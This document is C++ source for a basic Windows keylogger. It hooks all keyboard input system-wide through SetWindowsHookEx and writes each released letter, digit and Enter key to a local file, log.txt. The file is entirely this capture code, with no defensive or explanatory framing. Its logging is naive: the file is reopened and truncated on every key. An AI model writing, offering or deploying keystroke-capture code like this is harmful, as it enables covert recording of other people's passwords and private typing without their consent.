#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <iostream>
#include <fstream>
// function declaration.
#pragma comment(lib, "user32.lib")

using namespace std;

LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );
int main()
{

HINSTANCE appInstance = GetModuleHandle(NULL);

    SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0 );
MSG msg;
while(GetMessage(&msg, NULL, 0, 0) > 0)
{
        TranslateMessage(&msg);
        DispatchMessage(&msg);
}

return 0;
}
LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
ofstream myfile;
myfile.open("log.txt");
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
    switch( wParam )
    {
    case WM_KEYUP: 
        {
            switch( pKeyBoard->vkCode ) 
            {
            case VK_RETURN: 
                myfile<<"Enter  \n"; 
            break;

                   case 0x41:
                myfile<<"A  \n";
                break;

                    case 0x42:
                myfile<<"B  \n";
                break;  

                    case 0x43:
                myfile<<"C  \n";
                break;
                    case 0x44:
                myfile<<"D  \n";
                break;
                                case 0x45:
                myfile<<"E  \n";
                break;
                                case 0x46:
                myfile<<"F  \n";
                break;
                                case 0x47:
                myfile<<"G  \n";
                break;  
                                case 0x48:
                myfile<<"H  \n";
                break;
                                case 0x49:
                myfile<<"I  \n";
                break;
                                case 0x4A:
                myfile<<"J  \n";
                break;
                                case 0x4B:
                myfile<<"K  \n";
                break;

                                case 0x4C:
                myfile<<"L  \n";
                break;

                                case 0x4D:
                myfile<<"M  \n";
                break;

                                case 0x4E:
                myfile<<"N  \n";
                break;

                                case 0x4F:
                myfile<<"O  \n";
                break;

                               case 0x50:
                myfile<<"P  \n";
                break;
                               case 0x51:
                myfile<<"Q  \n";
                break;

                               case 0x52:
                myfile<<"R  \n";
                break;

                                case 0x53:
                myfile<<"S  \n";
                break;
                                case 0x54:
                myfile<<"T  \n";
                break;

                                case 0x55:
                myfile<<"U  \n";
                break;
                                case 0x56:
                myfile<<"V  \n";
                break;
                                case 0x57:
                myfile<<"W  \n";
                break;
                                case 0x58:
                myfile<<"X  \n";
                break;          case 0x59:
                myfile<<"Y  \n";
                break;
                                case 0x5A:
                myfile<<"Z  \n";
                break;


                case 0x30:
                myfile<<"0 \n";
                break;  

                case 0x31:
                myfile<<"1 \n"; 
                break;


                case 0x32:
                myfile<<"2 \n"; 
                break;


                case 0x33:
                myfile<<"3 \n"; 
                break;


                case 0x34:
                myfile<<"4 \n"; 
                break;


                case 0x35:
                myfile<<"5 \n"; 
                break;


                case 0x36:
                myfile<<"6 \n"; 
                break;  


                case 0x37:
                myfile<<"7 \n"; 
                break;  


                case 0x38:
                myfile<<"8 \n"; 
                break;

                case 0x39:
                    myfile<<"9 \n";

                    break;
            }
        }
    default:
        return CallNextHookEx( NULL, nCode, wParam, lParam );
    }
    myfile.close();
    return 0;
}